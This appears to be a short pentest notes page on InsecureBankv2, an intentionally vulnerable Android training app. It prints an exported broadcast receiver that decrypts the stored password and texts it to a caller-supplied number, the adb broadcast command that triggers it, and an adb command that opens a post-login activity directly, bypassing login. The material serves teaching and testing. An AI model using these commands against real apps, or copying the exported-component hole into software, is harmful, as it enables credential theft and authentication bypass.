- [Broadcast Receiver](#BroadcastReceiver)
  - [Broadcast Receiver Discription](#Broadcast_receiver_description)
  - [Exported Broadcast Receiver](#Exported_broadcast_receiver)
    - [AndroidManifest declaration](#AndroidManifest.xml)
    - [Method code implementation](#method_code)
    - [ADB exploitation](#adb_exploitaion)
- [Activity](#Activity)
  - []()
    []()
  - [Exported Activity Bypassing](#Exported_activity_bypassing)
    - [Manifset](#Manifset)

# BroadcastReceiver

## Broadcast_receiver_description
Broadcast receivers are designed to listen to system wide events called broadcasts (e.g. network activity, application updates, etc.) and then trigger something if the broadcast message matches the current parameters inside the Broadcast Receiver

## Exported_broadcast_receiver

### AndroidManifest.xml
```
<receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
            <intent-filter>
                <action android:name="theBroadcast"/>
            </intent-filter>
        </receiver>
```
### method_code
```
public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {
            try {
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", null), 0), "UTF-8");
                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", null));
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
                smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Phone number is null");
        }
    }
```
### adb_exploitaion
```
am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver –es phonenumber 0123456789 –es newpass Test_pass123!
```
-------------------------------------------------------------------------------------------------------------------------------
# Activity

## Exported_activity_bypassing

### Manifset
```
<activity android:label="@string/title_activity_post_login" 
android:name="com.android.insecurebankv2.PostLogin" android:exported="true"/>

Bypassing: adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```
